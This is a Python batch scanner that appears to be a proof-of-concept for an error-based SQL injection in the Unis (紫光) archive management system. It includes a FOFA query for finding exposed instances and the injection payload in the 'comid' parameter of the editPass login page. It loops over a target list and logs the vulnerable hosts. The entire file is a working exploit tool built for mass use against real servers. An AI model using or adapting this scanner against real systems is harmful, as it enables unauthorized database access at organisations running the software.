#!/usr/bin/python3  
# -*- coding: utf-8 -*-  
# author : Lem  
import urllib.request  
import re  
import requests  
import io  
import sys  
requests.packages.urllib3.disable_warnings()  
#fofa: app="紫光档案管理系统"

def basic_setting():
    timeout_s=3 
    regex_match=r'md5(.+?)\s' #自定义正则匹配规则
    proxies = {  
    'http': 'http://127.0.0.1:8080',  #proxies=proxies
    'https': 'http://127.0.0.1:8080',  
    }
    
    return timeout_s,regex_match,proxies


def readfiles(): #批量读取文件，文本格式为https://127.0.0.1:8080
    result = [] 
    with open(r'urls.txt' ,'r') as f:
        for line in f:
         result.append(line.strip().split(',')[0])  
        return result


def all_poc():  #自定义poc内容
    poc_url = "/login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5(1)))"  
    poc_post_data = 'hello=hello'  
    header = {#'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
          #'Accept-Encoding': 'gzip, deflate',
          #'Accept-Language': 'zh-CN,zh;q=0.9',
          #'Cache-Control': 'max-age=0',
          #'Connection': 'keep-alive',
          #'Cookie': 'cookie',
          #'Host': 'www.baidu.com',
          'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36'
          }
    files = {"file":("test.txt","hello")}  #Content-Disposition: form-data; name="file"; filename="test.txt"
    return poc_url, poc_post_data,header,files  

  
def scan_urls_post():  
    poc_url, poc_post_data,header,files = all_poc()  
    result = readfiles()   
    #timeout_s,regex_match,proxies = basic_setting()
    timeout_s,regex_match,_ = basic_setting()  #禁用proxies
    for url in result:  
        #scan = str(url) + poc_url
        scan = f"{url}{poc_url}"   
        print(scan)  
        try:
            #re_data = requests.post(scan,data=poc_post_data,timeout=timeout_s,headers=header,verify=False,proxies=proxies)  #post data  proxies=proxies
            re_data = requests.post(scan,data=poc_post_data,timeout=timeout_s,headers=header,verify=False)  #post data
            #re_data = requests.post(scan,files=files,timeout=timeout_s,headers=header,verify=False)  #post files
            print(re_data.status_code)  
            if re_data.status_code == 200:  
                find_list = re.findall(regex_match, re_data.text)  
                print(find_list)  
                with open('scan_out.txt', mode='a') as file_handle:  
                    #a = scan + "-"+str(find_list) 
                    a = f"{scan}-{find_list}" 
                    #file_handle.write(str(a) + "\n") 
                    file_handle.write(f"{a}\n") 
            else:  
                print("不存在")  
                #print(re_data.text)  
        except requests.exceptions.RequestException as e:  
            print("请检查目标列表")  
            #print(re_data.status_code)  
            print(str(e))  

def scan_urls_get():  
    poc_url, _ ,header, _= all_poc() 
    result = readfiles()  
    timeout_s,regex_match,proxies = basic_setting()
    #timeout_s,regex_match,_ = basic_setting() #禁用proxies
  
    for url in result:  
        #scan = str(url) + poc_url 
        scan = f"{url}{poc_url}"  
        print(scan)  
        try:  
            #re_data = requests.get(scan,timeout=timeout_s,headers=header,verify=False)
            re_data = requests.get(scan,timeout=timeout_s,headers=header,verify=False,proxies=proxies)  
            print(re_data.status_code)  
            if re_data.status_code == 200:  
                find_list = re.findall(regex_match, re_data.text)  
                print(find_list)  
                with open('scan_out.txt', mode='a') as file_handle:  
                    #a = scan + "-"+str(find_list)
                    a = f"{scan}-{find_list}"   
                    #file_handle.write(str(a) + "\n") 
                    file_handle.write(f"{a}\n")
            else:  
                print("不存在")  
                #print(re_data.text)  
        except requests.exceptions.RequestException as e:  
            print("请检查目标列表")  
            #print(re_data.status_code)  
            print(str(e))  
  


  
if __name__ == '__main__':    
    scan_urls_get()
    #scan_urls_post()